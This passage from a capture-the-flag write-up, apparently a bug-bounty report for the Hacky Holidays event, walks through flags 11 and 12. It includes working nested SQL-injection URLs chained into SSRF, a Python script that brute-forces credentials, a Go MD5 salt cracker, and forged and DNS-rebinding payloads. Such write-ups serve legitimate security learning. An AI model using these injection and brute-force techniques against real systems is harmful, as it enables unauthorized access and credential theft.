Some of my earlier manual fiddling resulted in `asdasd' UNION ALL SELECT 1,1,1;/*` pulling back photos from an album. Changing the first `1` to `2` and then `3` pulled back photos from each of the other two photo albums. This made me think the page was running two queries behind the scenes. Something along the lines of:

Pull the requested photo album out by it's hash (from query param `hash`):

`SELECT id, x, y FROM albums WHERE hash = ?`

And then pull all photos out for that album, using the returned `id` from the above query as the album id:

`SELECT * FROM photos WHERE album_id = ?`

I had also taken a look at the script that loaded each image content. The output of the gallery script loaded images using the following:

{F1134516}

Decoding the base64 parameter for one of them revealed:

```json
{"image":"r3c0n_server_4fdk59\/uploads\/0a382c6177b04386e1a45ceeaa812e4e.jpg","auth":"ec5a9920e177ccc84974146f93ae04b0"}
```

I realised I could potentially trick the `picture` script into including other local files by abusing the `data` parameter, if I set the `image` field in the JSON to an arbritary file. It turned out this didn't work because of the `auth` hash. It looked like this hash was a hash of the `image` value and an unknown salt, meaning this wasn't exploitable without further information - I would have needed to set the hash to the correct value, which was unknowable. I tried brute forcing salts but didn't get anywhere.

At this point it clicked that these two vulnerabilities could be chained - I could use the SQL injection to set an arbitrary path, and the gallery script would automatically set the auth hash for me, then calling the `picture` script with the gallery-generated value would give me LFI (or SSRF).


```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%220a382c6177b04386e1a45ceeaa812e4e.jpg\%22;/*%22,1,1;/*
```

This request worked - I could now control the source of the image on the page!

### Chaining Vulnerabilities

I realised that the `picture` script could be pulling images via an HTTP request internally, rather than including them, which would mean a way to call the API from `localhost` via SSRF.

I assembled the following request to verify if the images were being pulled via HTTP request or direct inclusion. It simply involved adding a query string parameter `?whatever=1` to the previous URL. The plan was the query parameter `whatever` would be handled properly by an HTTP server (effectively ignored), but would not be translatable to the file system of the host. 

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,1,\%220a382c6177b04386e1a45ceeaa812e4e.jpg?whatever%3d1\%22;/*%22,1,1;/*
```

This request worked - the image was still loaded. So it looked like I had an SSRF vulnerability - via SQL injection - inside of *another* SQL injection. 

{F1134508}

The image paths in the database that I dumped earlier were simply filenames with no directory information. I knew from decoding the base64 in the `picture` links that the images live in the `uploads` directory, so any SSRF paths need to be constructed relative to that directory.

I wanted to try and call the API via the SSRF, so I assembled the following:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/hello\%22;/*%22,1,1;/*
```

Calling this URL gave us a `picture` endpoint URL which should result in an SSRF on the `api/hello` endpoint. I didn't expect this endpoint to actually exist - but I was hoping for an improvement on the `401` received by calling anything `api/*` directly over the internet. A `404` would be nice.

```
$ curl -s 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/hello\%22;/*%22,1,1;/*' | grep picture
                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2hlbGxvIiwiYXV0aCI6ImEwZTY4MmQ2YjRiNWVjYTM2NDJlMTU5NmQ4OGE5MDk2In0=">

$ curl -s 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2hlbGxvIiwiYXV0aCI6ImEwZTY4MmQ2YjRiNWVjYTM2NDJlMTU5NmQ4OGE5MDk2In0='

Expected HTTP status 200, Received: 404
```

This was interesting! The `picture` script complained that it wanted a `200` status, but got a `404` instead. This meant I was no longer experiencing `401` statuses!

I tried a few common endpoints and spotted a `200` response for the `api/user` endpoint. Sadly the raw response wasn't returned, as the `picture` script complained about a bad content type, probably because it was expecting an image and instead received some JSON describing a user!

I tried appending some query string parameters to see if it was possible to check for the existance of different users, and spotted that when `?username=blah` was appended, a `404` was returned! So it looked possible to brute force usernames. I tried this and was initially unsuccessful, until I spotted `?username=%25` didn't return a `404`! Wildcards were accepted, meaning I could brute force much quicker!

I knocked up a bit of Python to do the job for me:

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup as BSHTML

start=''
alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'

def guess(start):
    for letter in alphabet:
        attempt=start+letter
        url = f'''https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,1,\%22../api/user?username={attempt}%25\%22;/*%22,1,1;/*'''
        r = requests.get(url)
        soup = BSHTML(r.text, "html.parser")
        images = soup.findAll('img')
        r = requests.get("https://hackyholidays.h1ctf.com" + images[1]["src"])
        if len(r.text) != 39:
            return attempt
    return start

updated=guess(start)
while updated != start:
    start = updated
    updated=guess(start)
    print("nearly there: " + updated)

print("found: " + updated)
```

Running the script quickly revealed:

```
found: grinchadmin
```

Awesome! Next I needed to find the password - could it be as simple as doing the same thing with a password parameter? I didn't expect this to work, but it did! I adjusted the above script and swapped `?username=` for `?password=` and ran it, finding:

```
found: s4nt4sucks
```

I now had a set of credentials: `grinchadmin:s4nt4sucks`. Going back to the login page I spotted at the beginning of the challenge and trying these credentials there seemed like a logical next step, so I did so.

![attack box](flag11.d.png)

Another flag down!

Flag: `flag{07a03135-9778-4dee-a83c-7ec330728e72}`

## Flag 12: DDoS

This challenge continues from where I left off in the previous one. I had access to the "attack box", which contained links to launch DDoS attacks on various preset targets.

The links looked like this:

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

Clicking the above link resulted in a DDoS attack being launched, which hilariously is the l33t hacker tool *ping*!

{F1134513}

I decoded the `payload` parameter from the above link and found:

```
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

So the payload contained the IP address to launch an attack against. I tried to encode my own payload with a target of `127.0.0.1`:

```bash
$ echo '{"target":"127.0.0.1","hash":"5f2940d65ca4140cc18d0878bc398955"}' | base64 -w 0
eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQo=
```

Navigating to the original link but with the payload swapped out for the one I generated above resulted in an error:

```
Invalid Protection Hash
```

In order to supply my own target, I needed to also provide a valid `hash` parameter. So what could this be? The most likely setup was this hash was generated from a combination of the `target` value and a secret salt, which I didn't know.

However, I had a valid example with a `target` and it's associated `hash`, so I could try to brute force the salt.

I wrote a quick bit of Go for speed, and loaded up rockyou.txt as my wordlist. This created MD5 hashes of `203.0.113.33` appended to each word in the wordlist, and each word in the wordlist appended to `203.0.113.33` i.e. md5("${ip}${salt}") and md5("${salt}${ip}"). It would stop when a produced hash matched the epxected one: `5f2940d65ca4140cc18d0878bc398955`.

```go
package main

import (
	"bufio"
	"crypto/md5"
	"fmt"
	"io"
	"os"
)

const target = "5f2940d65ca4140cc18d0878bc398955"
const input = `203.0.113.33`

func main() {
	file, err := os.Open("/home/liamg/Downloads/rockyou.txt")
	if err != nil {
		panic(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		salt := scanner.Text()
		if hash(input+salt) == target {
			panic("Found salt md5(input+salt): " + salt)
		}
		if hash(salt+input) == target {
			panic("Found salt md5(salt+input): " + salt)
		}
	}

	if err := scanner.Err(); err != nil {
		panic(err)
	}

	panic("FAILED")
}

func hash(i string) string {
	h := md5.New()
	io.WriteString(h, i)
	return fmt.Sprintf("%x", h.Sum(nil))
}
```

After 30 seconds or so, this program spat out the salt!

```
Found salt md5(salt+input): mrgrinch463
```

Amazing! Now I had the means to make the DDoS system trust my payload and take `127.0.0.1` as a parameter, forcing it to launch an attack on itself!

```bash
$ echo -n "mrgrinch463127.0.0.1" | md5sum
3e3f8df1658372edf0214e202acb460b  -
```

Assembling the payload:

```bash
$ echo '{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}' | base64 -w0
eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQo= 
```

Trying it out on the endpoint:

{F1134511}

The system detected the target was local and cancelled the attack.

I decided to try `127.0.0.2`, which will also point at the local machine via loopback. This worked, and the attack was launched, but it was an unintended solution, as I didn't get presented with the flag:

{F1134509}

I went back to the drawing board to try and find the intended route. The attack script looked like it did a couple of things. First of all it got "host information", which I assumed meant resolving a hostname to an IP address and deciding if it was a local IP. Next it launched an attack on the given address.

After a bit of trial and error, I tried a DNS rebind attack. If I could provide a hostname which resolved to an "external" IP on the first step, but then resolved to `127.0.0.1` on the second, the check would pass and an attack would be launched on the local machine.

I built a payload using the `7f000001.c0a80001.rbndr.us` address provided by [taviso/rbndr](https://github.com/taviso/rbndr), which will constantly switch between resolving to 192.168.0.1 and 127.0.0.1:

```
https://hackyholidays.h1ctf.com/attack-box/launch/?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9Cg==
```

After several attempts trying to get things to resolve in the desired order:

{F1134507}

...and...

{F1134510}

Mission accomplished! I have successfully pinged (pung?) the Grinch Networks servers to death!

Flag: `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`

## Thanks!

Thanks very much to those who put the challenge together, I had a great time and learned a few new tricks! Also, I hate you just a little bit for flag 11. <3.

## Impact

Hopefully a $500 bounty ;)

## Attachments
- flag12.d.png
- iheardyoulikesqlinjection.jpg
- flag12.c.png
- done.png
- flag12.b.png
- flag12.a.png
- flag11.d.png
- flag11.b.png
- flag11.c.png
- flag11.a.png
- flag10.b.png
- flag9.a.png
- flag10.a.png
- flag8.d.png
- flag8.c.png
- flag8.b.png
- flag8.a.png
- flag7.h.png
- flag7.g.png
- flag7.f.png
- flag7.e.png
- flag7.d.png
- flag7.c.png
- flag7.a.png
- flag7.b.png
- flag5.f.png
- flag5.e.png
- flag5.d.png
- flag5.c.png
- flag5.b.png
- flag5.a.png
- flag4.a.png
- flag4.b.png
- flag2.b.png
- flag2.a.png
- jake.jpg
